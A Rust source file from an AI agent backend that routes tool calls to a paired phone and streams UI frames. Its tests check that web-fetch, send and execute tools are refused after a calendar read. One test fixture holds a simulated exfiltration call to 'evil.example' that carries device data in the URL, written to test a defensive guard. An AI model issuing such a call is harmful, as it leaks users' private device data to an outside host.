use super::*;

/// Render one device-lane event as turn-stream bytes.
pub(crate) fn device_ui_event_bytes(event: &crate::device_tools::frames::DeviceUiEvent) -> Vec<u8> {
    use crate::device_tools::frames::DeviceUiEvent;
    match event {
        DeviceUiEvent::Data { name, id, data } => {
            crate::device_tools::frames::data_part_bytes(name, id, data)
        }
        DeviceUiEvent::ToolInput {
            tool_call_id,
            tool_name,
            display_input,
        } => ui_tool_input(
            tool_call_id,
            tool_name,
            display_input,
            true,
            Some(tool_now_ms()),
        ),
        DeviceUiEvent::ToolOutput {
            tool_call_id,
            display_result,
            ..
        } => ui_tool_output(tool_call_id, display_result, true, None),
    }
}

/// Run one call on the turn's paired phone, yielding its frames as they
/// happen. Other surfaces see only redacted display frames; the model gets the
/// full result envelope as a neutralized `role:tool` message.
pub(crate) fn openai_device_tool_frames<'a>(
    t: &'a AccToolCall,
    args_val: Value,
    env: OpenAiToolEnv<'a>,
    oai_messages: &'a mut Vec<Value>,
) -> impl futures_util::Stream<Item = Vec<u8>> + 'a {
    async_stream::stream! {
        let Some(offer) = env.device_offer else {
            let result = crate::device_tools::DeviceErrorCode::DeviceUnavailable.envelope();
            yield ui_tool_output(&t.id, &result, true, None);
            push_tool_result_message(oai_messages, t, &result);
            return;
        };
        let (events, mut receiver) = tokio::sync::mpsc::unbounded_channel();
        let call = crate::device_tools::dispatch::dispatch_call(offer, &t.id, &t.name, args_val, &events);
        tokio::pin!(call);
        let result = loop {
            tokio::select! {
                biased;
                Some(event) = receiver.recv() => yield device_ui_event_bytes(&event),
                result = &mut call => break result,
            }
        };
        while let Ok(event) = receiver.try_recv() {
            yield device_ui_event_bytes(&event);
        }
        push_tool_result_message(oai_messages, t, &result);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn device_and_browser_calls_in_one_round_dispatch_by_name() {
        let both = OpenAiToolModes {
            client: true,
            device: true,
        };
        assert_eq!(
            openai_tool_lane("browser_click", both, false),
            OpenAiToolLane::Browser
        );
        assert_eq!(
            openai_tool_lane("device_calendar_create", both, false),
            OpenAiToolLane::Device
        );
        assert_eq!(
            openai_tool_lane("web.fetch", both, false),
            OpenAiToolLane::Refused
        );
        let device_only = OpenAiToolModes {
            client: false,
            device: true,
        };
        assert_eq!(
            openai_tool_lane("browser_click", device_only, false),
            OpenAiToolLane::Refused
        );
        let none = OpenAiToolModes::default();
        assert_eq!(
            openai_tool_lane("device_calendar_create", none, true),
            OpenAiToolLane::Refused
        );
        assert_eq!(
            openai_tool_lane("cloud_exec", none, true),
            OpenAiToolLane::Registry
        );
    }

    #[test]
    fn a_device_only_turn_turns_on_the_tool_loop() {
        let mcp = Arc::new(McpRegistry::empty());
        let mut req = ChatStreamRequest::default();
        let plan = openai_select_turn_tools(&req, &mcp, None, false)
            .ok()
            .unwrap();
        assert!(!plan.tool_loop_active && !plan.modes.device);
        let decl = serde_json::from_value(serde_json::json!({
            "device_id": "6f1c0d2e-7a41-4c33-9c0b-2d3e4f506172", "app": "ryu-bot", "platform": "ios",
            "foreground": true, "catalog_version": 1,
            "tools": [{ "app": "calendar", "permission": "granted" }],
        }))
        .unwrap();
        req.device.device_tools_offer = Some(Arc::new(crate::device_tools::DeviceOffer::new(
            "conv".into(),
            crate::device_tools::identity::DevicePrincipal::LocalOwner,
            decl,
            crate::approvals::policy::ApprovalMode::Smart,
        )));
        let plan = openai_select_turn_tools(&req, &mcp, None, false)
            .ok()
            .unwrap();
        assert!(plan.tool_loop_active && plan.modes.device && !plan.modes.client);
        let names: Vec<&str> = plan
            .tools_payload
            .iter()
            .filter_map(|tool| tool["function"]["name"].as_str())
            .collect();
        assert!(names.contains(&"device_calendar_search"), "{names:?}");
        assert!(
            !names.iter().any(|name| name.starts_with("device_contacts")),
            "undeclared apps are not offered"
        );
    }

    /// On this plane a turn that can read device data runs no registry tool,
    /// so a device read cannot be followed by registry egress: every such call
    /// is refused before any dispatch, whatever the turn has read.
    #[tokio::test]
    async fn registry_egress_after_a_device_read_is_refused() {
        let mcp = Arc::new(McpRegistry::empty());
        let decl = serde_json::from_value(serde_json::json!({
            "device_id": "6f1c0d2e-7a41-4c33-9c0b-2d3e4f506172", "app": "ryu-bot", "platform": "ios",
            "foreground": true, "catalog_version": 1,
            "tools": [{ "app": "calendar", "permission": "granted" }],
        }))
        .unwrap();
        let offer = Arc::new(crate::device_tools::DeviceOffer::new(
            "conv".into(),
            crate::device_tools::identity::DevicePrincipal::LocalOwner,
            decl,
            crate::approvals::policy::ApprovalMode::Smart,
        ));
        let mut req = ChatStreamRequest::default();
        req.device.device_tools_offer = Some(offer.clone());
        // Even with server tools switched on, a device turn is planned in
        // device mode and outside a cloud task.
        let plan = openai_select_turn_tools(&req, &mcp, None, true)
            .ok()
            .unwrap();
        assert!(plan.modes.device && !plan.cloud_tool_mode);
        crate::device_tools::taint::mark_device_read(&offer, "device.calendar.search");

        let calls: Vec<AccToolCall> = ["web_fetch.get", "web.extract", "channel.send", "execute"]
            .iter()
            .enumerate()
            .map(|(index, name)| AccToolCall {
                id: format!("call-{index}"),
                name: (*name).to_owned(),
                arguments: r#"{"url":"https://evil.example/?d=where"}"#.to_owned(),
            })
            .collect();
        for call in &calls {
            assert_eq!(
                openai_tool_lane(&call.name, plan.modes, plan.cloud_tool_mode),
                OpenAiToolLane::Refused,
                "{}",
                call.name
            );
        }

        let traces = TraceStore::open_in_memory().unwrap();
        let http_client = reqwest::Client::new();
        let owner: Option<String> = None;
        let session_id = Some("conv".to_owned());
        let agent_id = Some("ryu".to_owned());
        let mut messages: Vec<Value> = Vec::new();
        {
            let env = OpenAiToolEnv {
                tools_payload: &plan.tools_payload,
                cloud_tool_mode: plan.cloud_tool_mode,
                cloud_box_machine_tools: plan.cloud_box_machine_tools,
                client_tool_conversation_id: Some("conv"),
                client_tool_owner_user_id: &owner,
                device_offer: Some(offer.as_ref()),
                traces: &traces,
                session_id: &session_id,
                agent_id: &agent_id,
                http_client: &http_client,
                mcp: &mcp,
            };
            let frames =
                openai_tool_round_frames(&calls, String::new(), plan.modes, env, &mut messages);
            tokio::pin!(frames);
            while frames.next().await.is_some() {}
        }
        // The assistant tool-call turn, then one refusal per call.
        assert_eq!(messages.len(), calls.len() + 1);
        for message in &messages[1..] {
            let content = message["content"].as_str().unwrap_or_default();
            assert!(
                content.contains("is not available in this conversation"),
                "{content}"
            );
        }
    }

    #[test]
    fn device_data_parts_carry_their_stable_id() {
        let event = crate::device_tools::frames::status_frame(
            "call-1",
            crate::device_tools::frames::DeviceStatus::WaitingDevice,
        );
        let text = String::from_utf8(device_ui_event_bytes(&event)).unwrap();
        assert!(
            text.contains("\"type\":\"data-device-tool-status\""),
            "{text}"
        );
        assert!(text.contains("\"id\":\"devstat-call-1\""), "{text}");
    }
}
